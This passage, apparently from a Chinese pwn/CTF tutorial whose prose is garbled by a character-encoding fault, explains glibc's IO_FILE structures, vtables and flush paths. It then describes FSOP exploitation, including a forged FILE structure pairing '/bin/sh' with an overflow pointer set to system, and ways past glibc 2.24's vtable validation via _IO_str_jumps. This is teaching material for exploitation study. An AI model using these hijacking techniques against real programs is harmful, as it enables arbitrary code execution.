ç§æƒ…å†µã€‚\nå¦‚æœè¦è¯»å–çš„æ•°æ®å°äºå‰©ä½™çš„æ•°æ®_IO_read_ptr - _IO_read_endï¼Œé‚£ä¹ˆå°±ç›´æ¥å°†æ•°æ®è¯»å–åˆ°targetå³å¯ã€‚ å¦‚æœè¦è¯»å–çš„æ•°æ®å¤§äºå‰©ä½™çš„æ•°æ®_IO_read_ptr - _IO_read_end å…ˆå°†è¾“å…¥ç¼“å†²åŒºå…¨éƒ¨æ•°æ®è¯»å‡ºï¼Œå†è°ƒç”¨_IO_new_file_underflowä»ç¡¬ç›˜è¯»å…¥ä¸€å—æ•°æ®ã€‚ å¦‚æœéœ€è¦è¯»å–æ•°æ®ç‰¹åˆ«å¤šï¼Œå°±è°ƒç”¨__GI__IO_file_readä»ç¡¬ç›˜ç›´æ¥è¯»å–æ•°æ®ã€‚ è¯´æ˜ï¼šæˆ‘ä»¬å¹³æ—¶çš„è¾“å…¥å‡½æ•°ä¸»è¦å°±æ˜¯è°ƒç”¨æ­¤å‡½æ•°\n_IO_new_file_seekoff è®¾ç½®åç§»å‡½æ•°ï¼Œå°±æ˜¯è®¾ç½®æˆ‘ä»¬æ‰€è¯´çš„ptræŒ‡é’ˆã€‚\n_IO_default_seekpos å°±æ˜¯è°ƒç”¨_IO_new_file_seekoffã€‚\n_IO_new_file_setbuf è¿™ä¸ªå‡½æ•°ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œçœ‹åå­—å°±çŸ¥é“æ˜¯è®¾ç½®ç¼“å†²åŒºçš„ï¼Œä½œç”¨å°±æ˜¯åˆå§‹åŒ–å„ä¸ªç¼“å†²åŒº\n_IO_write_base = _IO_write_ptr = _IO_write_end = _IO_buf_base _IO_read_base = _IO_read_ptr = _IO_read_end = _IO_buf_base ï¼ˆä½¿ç”¨ _IO_setg å®ï¼‰ _IO_new_file_sync åŒæ­¥å‡½æ•°ï¼Œè´Ÿè´£ä¸ç¡¬ç›˜å’Œç¼“å†²åŒºä¹‹é—´è¿›è¡ŒåŒæ­¥ã€‚\n__GI__IO_file_doallocateï¼ˆ_IO_default_doallocateï¼‰ è¿™ä¸ªå°±æ˜¯ç”³è¯·ç¼“å†²åŒºçš„å‡½æ•°ï¼Œç”³è¯·å®Œä¹‹åè¿˜è¦æŠŠè¾“å…¥ã€è¾“å‡ºç¼“å†²åŒºåˆå§‹åŒ–ã€‚\n__GI__IO_file_readï¼ˆ_IO_file_readï¼‰ è¿™ä¸ªæ˜¯è¾“å…¥çš„æœ€ç»ˆå‡½æ•°ï¼Œå®ƒå°†syscall_readè¿›è¡Œäº†ä¸€å®šçš„å°è£…ã€‚\n_IO_new_file_write è¿™ä¸ªæ˜¯è¾“å‡ºçš„æœ€ç»ˆå‡½æ•°ï¼Œå®ƒå°†syscall_writeè¿›è¡Œäº†ä¸€å®šçš„å°è£…ã€‚\n__GI__IO_file_seekï¼ˆ_IO_file_seekï¼‰ è°ƒç”¨__lseek64ã€‚\n__GI__IO_file_closeï¼ˆ_IO_file_closeï¼‰ å°±å’Œåå­—ä¸€æ ·ï¼Œå…³é—­æ–‡ä»¶ã€‚\n__GI__IO_file_statï¼ˆ_IO_file_statï¼‰ è·å–æ–‡ä»¶æè¿°ç¬¦çš„çŠ¶æ€ã€‚è°ƒç”¨__fxstat64ã€‚\n_IO_default_showmanyc æ­¤å‡½æ•°æ²¡ç”¨ï¼Œè¿”å›-1ã€‚\n_IO_default_imbue æ­¤å‡½æ•°æ²¡ç”¨ã€‚\nå…¶ä»–ä¸€äº›å†…å®¹ flagæ ‡å¿—ä½ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #define _IO_MAGIC 0xFBAD0000 /* Magic number */ #define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */ #define _IO_MAGIC_MASK 0xFFFF0000 #define _IO_USER_BUF 1 /* User owns buffer; don\u0026#39;t delete it on close. */ #define _IO_UNBUFFERED 2 #define _IO_NO_READS 4 /* Reading not allowed */ #define _IO_NO_WRITES 8 /* Writing not allowd */ #define _IO_EOF_SEEN 0x10 #define _IO_ERR_SEEN 0x20 #define _IO_DELETE_DONT_CLOSE 0x40 /* Don\u0026#39;t call close(_fileno) on cleanup. */ #define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/ #define _IO_IN_BACKUP 0x100 #define _IO_LINE_BUF 0x200 #define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */ #define _IO_CURRENTLY_PUTTING 0x800 #define _IO_IS_APPENDING 0x1000 #define _IO_IS_FILEBUF 0x2000 #define _IO_BAD_SEEN 0x4000 #define _IO_USER_LOCK 0x8000 flushï¼ˆ_IO_do_flushï¼‰ æ¸…ç©ºç¼“å†²åŒºï¼Œå°†è¾“å‡ºç¼“å†²åŒºæ¸…ç©ºã€‚\nç¼“å†²åŒºè®¾ç½®å® _IO_setg _IO_setp ç­‰ç­‰\nè™šè¡¨çš„åˆå§‹åŒ– æˆ‘è®¤ä¸ºè¿™æ˜¯IOé‡Œé¢æœ€è®©äººå¤´ç–¼çš„åœ°æ–¹ï¼Œå®ƒçš„åˆå§‹åŒ–å½¢å¼ä½¿ç”¨å¤§é‡å®æ¥æ“ä½œï¼Œä¸ºäº†è¯´æ˜é—®é¢˜ï¼Œæˆ‘ä¸“é—¨æ‰¾äº†ä¸€ä¸ªä¸å¸¸ç”¨è™šè¡¨(wfile)ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 const struct _IO_jump_t _IO_wfile_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; libc_hidden_data_def (_IO_wfile_jumps) å…¶ä¸­ï¼Œå¸¦defaultçš„éƒ½æ˜¯å…±ç”¨çš„å‡½æ•°ï¼Œå¤§éƒ½åœ¨genops.cé‡Œé¢ï¼›new_fileå’Œfileçš„å¤§éƒ½åœ¨fileops.cé‡Œé¢ï¼›wdefaultæ˜¯å®½å­—ç¬¦å…±ç”¨çš„å‡½æ•°ï¼Œå¤§éƒ½åœ¨wgenops.cé‡Œé¢ï¼›åªæœ‰wfileçš„æ‰æ˜¯è‡ªå·±å•ç‹¬å®šä¹‰çš„å‡½æ•°ï¼Œåœ¨wfileops.cé‡Œé¢ã€‚ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºwfileå•ç‹¬å®šä¹‰çš„æ“ä½œåªæœ‰5ä¸ªã€‚\nå…¨éƒ¨æ¸…ç©ºå‡½æ•°ï¼ˆfflushï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # define fflush(s) _IO_fflush (s) // /assert/assert.c // /libio/iofflush.c int _IO_fflush (FILE *fp) { if (fp == NULL) return _IO_flush_all (); else { int result; CHECK_FILE (fp, EOF); _IO_acquire_lock (fp); result = _IO_SYNC (fp) ? EOF : 0; _IO_release_lock (fp); return result; } } libc_hidden_def (_IO_fflush) å¯ä»¥çœ‹å‡º fflushå‡½æ•°åœ¨å‚æ•°ä¸ºç©ºæ—¶ï¼Œæ¸…ç©º(_IO_flush_all_lockp =\u0026gt; _IO_OVERFLOW)å…¨éƒ¨æ–‡ä»¶ï¼›ä¸ä¸ºç©ºæ—¶ï¼ŒåŒæ­¥(sync)æŒ‡å®šæ–‡ä»¶ï¼Œä¸¤ç§æƒ…å†µæ‰§è¡Œæ­¥éª¤ä¸åŒã€‚\nFSOP FSOPæ‰§è¡Œæ˜¯é _IO_flush_all_lockpï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯åˆ·æ–°æ‰€æœ‰FILEç»“æ„ä½“çš„è¾“å‡ºç¼“å†²åŒºï¼Œæ‰§è¡Œè¿™ä¸ªç¨‹åºçš„æ—¶å€™ä¼šæ²¿ç€fp-\u0026gt;chainæ‰§è¡Œoverflowç¨‹åºã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int _IO_flush_all_lockp (int do_lock) { int result = 0; struct _IO_FILE *fp; int last_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 \u0026amp;\u0026amp; fp-\u0026gt;_mode \u0026gt; 0 \u0026amp;\u0026amp; (fp-\u0026gt;_wide_data-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_wide_data-\u0026gt;_IO_write_base)) #endif ) \u0026amp;\u0026amp; _IO_OVERFLOW (fp, EOF) == EOF) // å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰æ•°æ®ï¼Œåˆ·æ–°è¾“å‡ºç¼“å†²åŒº result = EOF; fp = fp-\u0026gt;_chain; //éå†é“¾è¡¨ } ... } _IO_flush_all_lockpè°ƒç”¨å‡½æ•°çš„æ—¶æœºåŒ…æ‹¬ï¼š\næ‰§è¡Œabortå‡½æ•°æ—¶ã€‚ï¼ˆ2.27ä¹‹åä¸å†åˆ·æ–°ï¼‰ __malloc_assertï¼ˆä»…åˆ·æ–° stderr ï¼Œ2.36åä¸å†åˆ·æ–°ï¼‰ æ‰§è¡Œexitå‡½æ•°æ—¶ã€‚ ä»mainå‡½æ•°è¿”å›æ—¶ã€‚ï¼ˆä¹Ÿæ˜¯æ‰§è¡Œexitï¼‰ é¦–å…ˆæ˜¯abortå‡½æ•°çš„æµç¨‹ï¼Œåˆ©ç”¨çš„double freeæ¼æ´è§¦å‘ï¼Œæ ˆå›æº¯ä¸ºï¼š\n1 2 3 4 5 6 7 8 _IO_flush_all_lockp (do_lock=do_lock@entry=0x0) __GI_abort () __libc_message (do_abort=do_abort@entry=0x2, fmt=fmt@entry=0x7ffff7ba0d58 \u0026#34;*** Error in `%s\u0026#39;: %s: 0x%s ***\\n\u0026#34;) malloc_printerr (action=0x3, str=0x7ffff7ba0e90 \u0026#34;double free or corruption (top)\u0026#34;, ptr=\u0026lt;optimized out\u0026gt;, ar_ptr=\u0026lt;optimized out\u0026gt;) _int_free (av=0x7ffff7dd4b20 \u0026lt;main_arena\u0026gt;, p=\u0026lt;optimized out\u0026gt;,have_lock=0x0) main () __libc_start_main (main=0x400566 \u0026lt;main\u0026gt;, argc=0x1, argv=0x7fffffffe578, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7fffffffe568) _start () exit å‡½æ•°ï¼Œæ ˆå›æº¯ä¸ºï¼š\n1 2 3 4 5 6 7 _IO_flush_all_lockp (do_lock=do_lock@entry=0x0) _IO_cleanup () __run_exit_handlers (status=0x0, listp=\u0026lt;optimized out\u0026gt;, run_list_atexit=run_list_atexit@entry=0x1) __GI_exit (status=\u0026lt;optimized out\u0026gt;) main () __libc_start_main (main=0x400566 \u0026lt;main\u0026gt;, argc=0x1, argv=0x7fffffffe578, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7fffffffe568) _start () ç¨‹åºæ­£å¸¸é€€å‡ºï¼Œæ ˆå›æº¯ä¸ºï¼š\n1 2 3 4 5 6 _IO_flush_all_lockp (do_lock=do_lock@entry=0x0) _IO_cleanup () __run_exit_handlers (status=0x0, listp=\u0026lt;optimized out\u0026gt;, run_list_atexit=run_list_atexit@entry=0x1) __GI_exit (status=\u0026lt;optimized out\u0026gt;) __libc_start_main (main=0x400526 \u0026lt;main\u0026gt;, argc=0x1, argv=0x7fffffffe578, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7fffffffe568) _start () ğŸ”—IO_FILEç›¸å…³ç»“æ„ä½“ _IO_FILE_plusç»“æ„ä½“çš„å®šä¹‰ä¸ºï¼š\n1 2 3 4 5 struct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; vtableå¯¹åº”çš„ç»“æ„ä½“_IO_jump_tçš„å®šä¹‰ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); #if 0 get_column; set_column; #endif }; è¿™ä¸ªå‡½æ•°è¡¨ä¸­æœ‰19ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«å®ŒæˆIOç›¸å…³çš„åŠŸèƒ½ï¼Œç”±IOå‡½æ•°è°ƒç”¨ï¼Œå¦‚fwriteæœ€ç»ˆä¼šè°ƒç”¨__writeå‡½æ•°ï¼Œfreadä¼šè°ƒç”¨__doallocateæ¥åˆ†é…IOç¼“å†²åŒºç­‰ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 struct _IO_FILE { int _flags; #define _IO_file_flags _flags char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; #define __HAVE_COLUMN unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; è¿›ç¨‹ä¸­FILEç»“æ„é€šè¿‡_chainåŸŸæ„æˆä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨å¤´éƒ¨ä¸º_IO_list_allå…¨å±€å˜é‡ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¾æ¬¡é“¾æ¥äº†stderr,stdout,stdinä¸‰ä¸ªæ–‡ä»¶æµï¼Œå¹¶å°†æ–°å»ºçš„æµæ’å…¥åˆ°å¤´éƒ¨ï¼Œvtableè™šè¡¨ä¸º_IO_file_jumpsã€‚ æ­¤å¤–ï¼Œè¿˜æœ‰_IO_wide_dataç»“æ„ä½“ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 struct _IO_wide_data { wchar_t *_IO_read_ptr; wchar_t *_IO_read_end; wchar_t *_IO_read_base; wchar_t *_IO_write_base; wchar_t *_IO_write_ptr; wchar_t *_IO_write_end; wchar_t *_IO_buf_base; wchar_t *_IO_buf_end; [...] const struct _IO_jump_t *_wide_vtable; }; è¿˜æœ‰ä¸€äº›å®çš„å®šä¹‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #define _IO_MAGIC 0xFBAD0000 #define _OLD_STDIO_MAGIC 0xFABC0000 #define _IO_MAGIC_MASK 0xFFFF0000 #define _IO_USER_BUF 1 #define _IO_UNBUFFERED 2 #define _IO_NO_READS 4 #define _IO_NO_WRITES 8 #define _IO_EOF_SEEN 0x10 #define _IO_ERR_SEEN 0x20 #define _IO_DELETE_DONT_CLOSE 0x40 #define _IO_LINKED 0x80 #define _IO_IN_BACKUP 0x100 #define _IO_LINE_BUF 0x200 #define _IO_TIED_PUT_GET 0x400 #define _IO_CURRENTLY_PUTTING 0x800 #define _IO_IS_APPENDING 0x1000 #define _IO_IS_FILEBUF 0x2000 #define _IO_BAD_SEEN 0x4000 #define _IO_USER_LOCK 0x8000 æ­¤å¤–ï¼Œè®¸å¤šPwné¢˜åˆå§‹åŒ–çš„æ—¶å€™éƒ½ä¼šæœ‰ä¸‹é¢ä¸‰è¡Œï¼š\n1 2 3 setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); è¿™æ˜¯åˆå§‹åŒ–ç¨‹åºçš„ioç»“æ„ä½“ï¼Œåªæœ‰åˆå§‹åŒ–ä¹‹åï¼Œioå‡½æ•°æ‰èƒ½åœ¨ç¨‹åºè¿‡ç¨‹ä¸­æ‰“å°æ•°æ®ï¼Œå¦‚æœä¸åˆå§‹åŒ–ï¼Œå°±åªèƒ½åœ¨exitç»“æŸçš„æ—¶å€™ï¼Œæ‰èƒ½ä¸€èµ·æŠŠæ•°æ®æ‰“å°å‡ºæ¥ã€‚\nçŒœæƒ³ ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œå¾ˆå¤šå‡½æ•°å¹¶æ²¡æœ‰ç”¨ï¼Œä½†ä¸ºä»€ä¹ˆè¿˜è¦è®¾ç½®è¿™äº›å‘¢ï¼Ÿä»¥ä¸‹æ˜¯æˆ‘çš„çŒœæƒ³ã€‚\nglibcçš„æ–‡ä»¶æ“ä½œç»å†äº†å¾ˆå¤šç‰ˆæœ¬è¿­ä»£ï¼Œä¸ºäº†å…¼å®¹ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œä¿ç•™äº†å¾ˆå¤šæ²¡æœ‰ç”¨çš„æ“ä½œã€‚ è·³è¡¨ç§ç±»å¾ˆå¤šï¼Œæˆ‘ä»¬ç›®å‰çœ‹åˆ°çš„æ˜¯fileæ“ä½œï¼Œè¿˜æœ‰å­—ç¬¦æ“ä½œï¼ˆstrï¼‰ã€å®½å­—ç¬¦ï¼ˆwdateï¼‰æ“ä½œã€å¸®åŠ©æ–‡æ¡£æ“ä½œï¼ˆhelpï¼‰ç­‰ç­‰ï¼Œæœ‰ä¸€äº›æ“ä½œæ˜¯ç‹¬æœ‰çš„ï¼Œç±»ä¼¼äº_IO_new_file_xsputnã€‚æœ‰ä¸€äº›æ˜¯é€šç”¨çš„æ“ä½œï¼Œç±»ä¼¼äº_IO_default_uflowã€‚ å…ˆå°†æ¡†æ¶æ­èµ·æ¥ï¼Œå¦‚æœä»¥åæœ‰éœ€è¦çš„æ—¶å€™å¯ä»¥æ–¹ä¾¿è¿›è¡Œæ‰©å±•ã€‚ å¯¹è¿™äº›æ¸…æ¥šäº†ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹çœ‹å…¶ä»–çš„houseåˆ°åº•æ˜¯å¹²ä»€ä¹ˆçš„äº†ã€‚\nIO_FILE attack ä¹‹ FSOP (libc 2.23 \u0026amp; 2.24) ä¸»è¦åŸç†ä¸ºåŠ«æŒvtableä¸_chainï¼Œä¼ªé€ IO_FILEï¼Œä¸»è¦åˆ©ç”¨æ–¹å¼ä¸ºè°ƒç”¨IO_flush_all_lockp()å‡½æ•°è§¦å‘ã€‚ IO_flush_all_lockp()å‡½æ•°å°†åœ¨ä»¥ä¸‹ä¸‰ç§æƒ…å†µä¸‹è¢«è°ƒç”¨ï¼š\nlibcæ£€æµ‹åˆ°å†…å­˜é”™è¯¯ï¼Œä»è€Œæ‰§è¡Œabortå‡½æ•°æ—¶ï¼ˆåœ¨glibc-2.26åˆ é™¤ï¼‰ã€‚ ç¨‹åºæ‰§è¡Œexitå‡½æ•°æ—¶ã€‚ ç¨‹åºä»mainå‡½æ•°è¿”å›æ—¶ã€‚ æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int _IO_flush_all_lockp (int do_lock) { int result = 0; struct _IO_FILE *fp; int last_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 \u0026amp;\u0026amp; fp-\u0026gt;_mode \u0026gt; 0 \u0026amp;\u0026amp; (fp-\u0026gt;_wide_data-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_wide_data-\u0026gt;_IO_write_base)) #endif ) \u0026amp;\u0026amp; _IO_OVERFLOW (fp, EOF) == EOF) //å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰æ•°æ®ï¼Œåˆ·æ–°è¾“å‡ºç¼“å†²åŒº result = EOF; fp = fp-\u0026gt;_chain; //éå†é“¾è¡¨ } [...] } å¯ä»¥çœ‹åˆ°ï¼Œå½“æ»¡è¶³ï¼š\n1 2 fp-\u0026gt;_mode = 0 fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_write_base å°±ä¼šè°ƒç”¨_IO_OVERFLOW()å‡½æ•°ï¼Œè€Œè¿™é‡Œçš„_IO_OVERFLOWå°±æ˜¯æ–‡ä»¶æµå¯¹è±¡è™šè¡¨çš„ç¬¬å››é¡¹æŒ‡å‘çš„å†…å®¹_IO_new_file_overflowï¼Œå› æ­¤åœ¨libc-2.23ç‰ˆæœ¬ä¸‹å¯å¦‚ä¸‹æ„é€ ï¼Œè¿›è¡ŒFSOPï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ._chain =\u0026gt; chunk_addr chunk_addr { file = { _flags = \u0026#34;/bin/sh\\x00\u0026#34;, //å¯¹åº”æ­¤ç»“æ„ä½“é¦–åœ°å€(fp) _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x1, ... _mode = 0x0, //ä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½® _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; }, vtable = heap_addr } heap_addr { __dummy = 0x0, __dummy2 = 0x0, __finish = 0x0, __overflow = system_addr, ... } å› æ­¤è¿™æ ·æ„é€ ï¼Œé€šè¿‡_IO_OVERFLOW (fp)ï¼Œæˆ‘ä»¬å°±å®ç°äº†system(\u0026quot;/bin/sh\\x00\u0026quot;)ã€‚\nè€Œlibc-2.24åŠ å…¥äº†å¯¹è™šè¡¨çš„æ£€æŸ¥IO_validate_vtable()ä¸IO_vtable_check()ï¼Œè‹¥æ— æ³•é€šè¿‡æ£€æŸ¥ï¼Œåˆ™ä¼šæŠ¥é”™ï¼šFatal error: glibc detected an invalid stdio handleã€‚\n1 2 3 4 5 6 #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-\u0026gt;FUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (*(struct _IO_jump_t **) ((void *) \u0026amp;_IO_JUMPS_FILE_plus (THIS) + (THIS)-\u0026gt;_vtable_offset))) å¯è§åœ¨æœ€ç»ˆè°ƒç”¨vtableçš„å‡½æ•°ä¹‹å‰ï¼Œå†…è”è¿›äº†IO_validate_vtableå‡½æ•°ï¼Œå…¶æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 static inline const struct _IO_jump_t * IO_validate_vtable (const struct _IO_jump_t *vtable) { uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset \u0026gt;= section_length)) //æ£€æŸ¥vtableæŒ‡é’ˆæ˜¯å¦åœ¨glibcçš„vtableæ®µä¸­ã€‚ _IO_vtable_check (); return vtable; } glibcä¸­æœ‰ä¸€æ®µå®Œæ•´çš„å†…å­˜å­˜æ”¾ç€å„ä¸ªvtableï¼Œå…¶ä¸­__start___libc_IO_vtablesæŒ‡å‘ç¬¬ä¸€ä¸ªvtableåœ°å€_IO_helper_jumpsï¼Œè€Œ__stop___libc_IO_vtablesæŒ‡å‘æœ€åä¸€ä¸ªvtable_IO_str_chk_jumpsç»“æŸçš„åœ°å€ã€‚ è‹¥æŒ‡é’ˆä¸åœ¨glibcçš„vtableæ®µï¼Œä¼šè°ƒç”¨_IO_vtable_check()åšè¿›ä¸€æ­¥æ£€æŸ¥ï¼Œä»¥åˆ¤æ–­ç¨‹åºæ˜¯å¦ä½¿ç”¨äº†å¤–éƒ¨åˆæ³•çš„vtableï¼ˆé‡æ„æˆ–æ˜¯åŠ¨æ€é“¾æ¥åº“ä¸­çš„vtableï¼‰ï¼Œå¦‚æœä¸æ˜¯åˆ™æŠ¥é”™ã€‚ å…·ä½“æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 void attribute_hidden _IO_vtable_check (void) { #ifdef SHARED void (*flag) (void) = atomic_load_relaxed (\u0026amp;IO_accept_foreign_vtables); #ifdef PTR_DEMANGLE PTR_DEMANGLE (flag); #endif if (flag == \u0026amp;_IO_vtable_check) //æ£€æŸ¥æ˜¯å¦æ˜¯å¤–éƒ¨é‡æ„çš„vtable return; { Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (_IO_vtable_check, \u0026amp;di, \u0026amp;l, NULL) != 0 \u0026amp;\u0026amp; l-\u0026gt;l_ns != LM_ID_BASE)) //æ£€æŸ¥æ˜¯å¦æ˜¯åŠ¨æ€é“¾æ¥åº“ä¸­çš„vtable return; } ... __libc_fatal (\u0026#34;Fatal error: glibc detected an invalid stdio handle\\n\u0026#34;); } å› æ­¤ï¼Œæœ€å¥½çš„åŠæ³•æ˜¯ï¼šæˆ‘ä»¬ä¼ªé€ çš„vtableåœ¨glibcçš„vtableæ®µä¸­ï¼Œä»è€Œå¾—ä»¥ç»•è¿‡è¯¥æ£€æŸ¥ã€‚ ç›®å‰æ¥è¯´ï¼Œæœ‰å››ç§æ€è·¯ï¼šåˆ©ç”¨_IO_str_jumpsä¸­_IO_str_overflow()å‡½æ•°ï¼Œåˆ©ç”¨_IO_str_jumpsä¸­_IO_str_finish()å‡½æ•°ä¸åˆ©ç”¨_IO_wstr_jumpsä¸­å¯¹åº”çš„è¿™ä¸¤ç§å‡½æ•°ï¼Œå…ˆæ¥ä»‹ç»æœ€ä¸ºæ–¹ä¾¿çš„ï¼šåˆ©ç”¨_IO_str_jumpsä¸­_IO_str_finish()å‡½æ•°çš„æ‰‹æ®µã€‚ _IO_str_jumpsçš„ç»“æ„ä½“å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), JUMP_INIT(underflow, _IO_str_underflow), JUMP_INIT(uflow, _IO_default_uflow), ... } å…¶ä¸­ï¼Œ_IO_str_finishæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 void _IO_str_finish (_IO_FILE *fp, int dummy) { if (fp-\u0026gt;_IO_buf_base \u0026amp;\u0026amp; !(fp-\u0026gt;_flags \u0026amp; _IO_USER_BUF)) (((_IO_strfile *) fp)-\u0026gt;_s._free_buffer) (fp-\u0026gt;_IO_buf_base); //æ‰§è¡Œå‡½æ•° fp-\u0026gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0); } å…¶ä¸­ç›¸å…³çš„_IO_str_fieldsç»“æ„ä½“ä¸_IO_strfile_ç»“æ„ä½“çš„å®šä¹‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 struct _IO_str_fields { _IO_alloc_type _allocate_buffer; _IO_free_type _free_buffer; }; typedef 